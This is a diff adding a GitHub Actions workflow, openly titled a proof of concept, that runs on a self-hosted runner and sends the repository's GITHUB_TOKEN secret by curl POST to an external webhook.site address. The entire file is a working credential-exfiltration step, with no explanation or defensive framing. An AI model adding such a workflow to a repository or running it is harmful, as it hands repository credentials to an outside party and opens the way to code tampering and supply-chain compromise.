@@ -1,0 +1,16 @@
+name: PoC Exfil GITHUB_TOKEN
+
+on:
+  workflow_dispatch:
+
+jobs:
+  exfil:
+    runs-on: self-hosted
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v3
+
+      - name: Leak GITHUB_TOKEN
+        run: |
+          echo "Exfiltrating token..."
+          curl -X POST -d "token=$GITHUB_TOKEN" https://webhook.site/3e3e91bd-f198-4f52-8ac5-91ae18e1280c
